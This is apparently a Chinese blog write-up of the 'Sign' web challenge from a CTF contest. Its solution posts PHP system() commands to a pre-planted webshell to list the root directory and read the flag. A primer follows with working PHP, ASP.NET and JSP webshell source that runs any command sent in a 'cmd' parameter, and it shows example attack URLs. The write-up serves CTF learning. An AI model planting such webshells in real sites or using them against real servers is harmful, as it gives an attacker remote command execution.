---
title: 吾杯网络安全技能大赛[Web方向]-Sign签到题
date: 2024-21-2
tags:
 - CTF
 - WriteUP
categories:
 - 随笔 Essay 
isShowComments: true
publish: true







---

<Boxx/>

参加了第一届吾杯网络安全技能大赛，这是一道Web方向的签到题，这是我的第24题

[[toc]]

- 网址【[传送门](https://www.wucup.net/)】

| 题目编号 | 题目名称 | 题目方向 | 难度 |
| -------- | -------- | -------- | ---- |
| 无       | Sign     | Web      | 1    |

<!-- more -->

# 题目24：Sign

### 题目描述：POST浅浅签个到吧

### 考点：WebShell的应用

### 预期解：通过WebShell的方式去执行命令

首先进入靶机，页面提示passwd:sgin

原本一开始想的是通过HackBar给目标传一个passwd的参数，参数的值是sgin，结果发现不可以，还是返回了passwd:sgin。尝试了多种方式，比如把sgin改成了sign等，种种方法都不行。

比赛结束后，参考了跑[**CHTXRT**](https://blog.csdn.net/CHTXRT/article/details/144175464)师傅的WriteUp，才发现是直接用WebShell的方式发一个POST请求，参数名是sgin，参数值直接就是system(ls /)等命令，这位师傅的WriteUp对我的启发很大，之前虽然学了WebShell的用法，但没有想到这道题是用WebShell来完成的。

```shell
sgin=system("ls /");
```

![image-20241202194034912](/img/essay/image-20241202194034912.png)

同理，我们看到目录下有个flag文件，直接cat该文件即可

```shell
sgin=system("cat /flag");
```

看了老师傅的WP，感受颇多，最近虽然刷了一些入门题单，但感觉都没形成条件反射，缺少很多基础知识，对于提示不敏感，以及对入门题单讲过的知识点和方法不熟悉，所以导致这道Web签到题都没有做出来

># WebShell 简介
>
>## 一、定义
>
>WebShell 是一种特殊的脚本文件，它允许攻击者通过网页浏览器与目标服务器进行交互，进而在服务器端执行各种命令，实现对服务器的一定程度的控制。
>
>## 二、常见类型及操作示例
>
>### PHP WebShell
>
>在基于 PHP 的网站环境中较为常见。以下是一个简单的 PHP WebShell 示例代码：
>
>```php
><?php
>if(isset($_GET['cmd'])){
>    $cmd = $_GET['cmd'];
>    system($cmd);
>    echo $cmd.'的执行结果：<br>';
>    echo '<pre>'.shell_exec($cmd).'</pre>';
>}
>?>
>```
>
>在这个示例中：
>
>- 首先通过 `isset($_GET['cmd'])` 检查是否通过 GET 请求传递了名为 `cmd` 的参数。
>- 如果存在该参数，就将其值赋给变量 `$cmd`。
>- 然后使用 `system($cmd)` 或 `shell_exec($cmd)` 函数来执行这个命令。`system` 函数会直接执行命令并输出结果到浏览器（但可能不会完整返回所有输出内容），而 `shell_exec` 函数执行命令后会返回完整的输出结果，这里通过 `<pre>` 标签对输出进行格式化展示，以便更清晰地查看。
>
>攻击者可以通过构造类似 `http://target.com/shell.php?cmd=ls -l` 的 URL 来执行服务器上的 `ls -l` 命令，查看指定目录下文件的详细信息等操作。
>
>### ASP/[ASP.NET](https://asp.net/) WebShell
>
>适用于基于微软的 IIS 服务器和 ASP/[ASP.NET](https://asp.net/)技术的网站。示例代码如下（简化示例）：
>
>```asp
><%@ Page Language="C#" %>
><%@ Import Namespace="System.Diagnostics" %>
><%
>if(Request.QueryString["cmd"]!= null)
>{
>    string cmd = Request.QueryString["cmd"];
>    ProcessStartInfo psi = new ProcessStartInfo(cmd);
>    psi.UseShellExecute = false;
>    psi.RedirectStandardOutput = true;
>    Process p = Process.Start(psi);
>    Response.Write(p.StandardOutput.ReadToEnd());
>}
>%>
>```
>
>在这个[ASP.NET](https://asp.net/)的示例中：
>
>- 首先判断是否通过 QueryString（类似 GET 请求方式）接收到名为 `cmd` 的参数。
>- 若接收到，将其赋值给变量 `cmd`。
>- 然后创建一个 `ProcessStartInfo` 对象来设置要执行的命令相关信息，通过 `Process.Start` 启动该命令的执行，并将执行结果通过 `Response.Write` 输出到浏览器，供攻击者查看。
>
>攻击者可通过构造如 `http://targetserver.com/shell.asp?cmd=dir` 的 URL 来执行服务器上的 `dir` 命令，获取当前目录下的文件列表信息。
>
>### JSP WebShell
>
>在 Java Web 应用环境下使用。示例代码如下：
>
>```jsp
><%@ page import="java.io.BufferedReader,java.io.InputStreamReader,java.io.IOException,java.lang.ProcessBuilder" %>
><%
>if(request.getParameter("cmd")!= null)
>{
>    String cmd = request.getParameter("cmd");
>    ProcessBuilder pb = new ProcessBuilder(cmd.split(" "));
>    pb.redirectErrorStream(true);
>    Process p = pb.start();
>    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
>    String line;
>    while ((line = br.readLine())!= null)
>    {
>        out.println(line);
>    }
>    br.close();
>}
>%>
>```
>
>在这个 JSP WebShell 示例中：
>
>- 同样先检查是否通过 `request.getParameter("cmd")` 接收到名为 `cmd` 的参数。
>- 若有，将其赋值给变量 `cmd`。
>- 接着使用 `ProcessBuilder` 来构建要执行的命令，并启动执行过程。通过 `BufferedReader` 读取命令执行的输出结果，并逐行输出到浏览器页面上，供攻击者查看执行情况。
>
>攻击者可通过构造如 `http://targetserver.com/shell.jsp?cmd=ls -al` 的 URL 来执行服务器上的 `ls -al` 命令，查看目录下文件的详细信息。
>
>## 三、使用场景及目的
>
>WebShell 通常被攻击者用于在成功入侵目标服务器后，进一步深入控制服务器。例如，通过执行文件操作命令来查看、修改或删除服务器上的文件；执行系统命令获取服务器的系统信息、网络配置等；或者利用服务器的资源进行其他恶意活动，如发动 DDoS 攻击等。在 CTF 比赛中，了解 WebShell 有助于理解某些涉及服务器攻击与防御相关的题目，帮助选手更好地分析题目思路和找到解题方法。

